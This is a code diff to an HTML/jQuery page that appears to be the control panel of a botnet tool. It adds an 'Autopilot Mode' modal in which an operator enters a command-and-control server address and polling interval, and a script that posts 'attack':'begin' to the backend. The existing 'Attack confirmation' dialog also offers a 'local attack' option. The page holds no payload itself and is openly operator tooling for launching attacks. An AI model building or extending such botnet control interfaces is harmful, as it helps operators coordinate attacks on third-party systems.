@@ -281,6 +281,61 @@
                     <i class="material-icons">send</i>
                 </a>
             </div>
+
+            <div class="fixed-action-btn vertical">
+                <a class="modal-trigger btn-floating btn-large red waves-effect waves-light" href="#modal1">
+                    <i class="large material-icons">send</i>
+                </a>
+                <ul>
+                    <li><a class="modal-trigger btn-floating yellow darken-1" href="#modal2"><i class="material-icons">system_update</i></a></li>
+                </ul>
+            </div>
+
+
+            <div id="modal2" class="modal modal-fixed-footer">
+                <div class="modal-content">
+                    <h4>Autopilot Mode</h4>
+                    <p>Set the botnet in autopilot mode, waiting for the C&C</p>
+                    <div class="container">
+                        <div class="input-field" style="margin-top: 10%">
+                            <label>Request update to C&C every * sec</label>
+                            <input type="text" id="contact_time" style="color: black" name="contact_time" value="1">
+                        </div>
+                        <div class="input-field" style="margin-top: 5%">
+                            <label>C&C server address</label>
+                            <input type="text" id="cc_server_auto" style="color: black" name="contact_time">
+                        </div>
+                    </div>
+                </div>
+                    <div class="modal-footer">
+                        <a href="#!" id="autopilot_start" class="modal-action waves-effect waves-green btn-flat">Yes</a>
+                        <a href="#!" class="modal-action modal-close waves-effect waves-red btn-flat ">No</a>
+                    </div>
+                </div>
+            </div>
+            <script>
+                $(function () {
+                    $("#autopilot_start").click(function () {
+                        data = {"autopilot_start":"true","attack":"begin","contact_time":$("#contact_time").val(),
+                                "cc_server_auto":$("#cc_server_auto").val()}
+                        $.ajax({
+                            url: "/submit",
+                            method: "POST",
+                            data: JSON.stringify(data),
+                            dataType: "json",
+                            contentType: 'application/json; charset=utf-8',
+                            success: function (result) {
+                                $("#result").text("BOT SET IN AUTOPILOT MODE").css("color", "green");
+                            },
+                            error: function () {
+                                $("#result").text("AN ERROR OCCURRED").css("color", "red");
+                            }
+                        });
+                    })
+                })
+            </script>
+
+
             <div id="modal1" class="modal modal-fixed-footer">
                 <div class="modal-content">
                     <h4>Attack confirmation</h4>
@@ -289,14 +344,13 @@
                         <div class="indeterminate"></div>
                     </div>
                     <p>
-                      <input type="checkbox" id="local_attack" name="local_attack"/>
-                      <label for="local_attack">Perform a local attack instead</label>
+                        <input type="checkbox" id="local_attack" name="local_attack"/>
+                        <label for="local_attack">Perform a local attack instead</label>
                     </p>
                     <br><br>
                     <p id="result"></p>
                 </div>
                 <div class="modal-footer">
-
                     <a href="#!" id="begin" class="modal-action waves-effect waves-green btn-flat ">Yes</a>
                     <a href="#!" class="modal-action modal-close waves-effect waves-red btn-flat ">No</a>
                 </div>
@@ -311,8 +365,8 @@
                             var check = 0;
                             var valid;
                             $(formArray).each(function (index, elem) {
-                                if (elem.value == "") {
-                                    $("#result").text(elem.name + " has no value. Please fill all fields").css("color","orange");
+                                if (elem.value == "" && elem.name != "divider") {
+                                    $("#result").text(elem.name + " has no value. Please fill all fields").css("color", "orange");
                                     return valid = false;
                                 }
                                 if (elem.name == "divider") {
@@ -370,12 +424,12 @@
                                     $('.progress').css("visibility", "hidden");
                                     console.log("done");
                                     console.log(data);
-                                    $("#result").text("DONE").css("color","green");
+                                    $("#result").text("DONE").css("color", "green");
                                 },
                                 error: function () {
                                     $('.progress').css("visibility", "hidden");
                                     console.log(data);
-                                    $("#result").text("AN ERROR OCCURRED").css("color","red");
+                                    $("#result").text("AN ERROR OCCURRED").css("color", "red");
                                 }
                             });
                         });
